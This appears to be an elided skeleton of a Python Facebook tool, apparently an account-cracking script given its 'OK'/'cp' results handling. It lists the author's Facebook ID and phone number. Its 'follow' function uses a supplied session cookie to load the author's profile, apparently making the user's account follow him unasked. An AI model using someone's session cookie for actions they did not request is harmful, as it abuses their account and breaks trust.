import os 
 ...
 ........:::..:::::..::........:::.......::::......:::..:::::..::::: 
  ...
  [$]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[$] 
     ...
     Facebook : facebook.com/100000661131869
  
     Connect  : +213554954461
 ...
 def hasil(OK,cp): 
         ...
         if len(cp) != 0: 
             ...
             input("\x1b[1;97mPress enter to back Yacine Menu ") 
 ...
 class __xxx__: 
     ...
     def follow(self, session, coki): 
         ...
         r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100000661131869', cookies={'cookie': coki}).text, 'html.parser') 
 ...
 def dupcutter(): 
         ...
         os.system("xdg-open https://wa.me/qr/5LP43FEEXPL2I1") 
 ...
 def yt(): 
         ...
         os.system("xdg-open https://www.facebook.com/profile.php?id=100000661131869") 
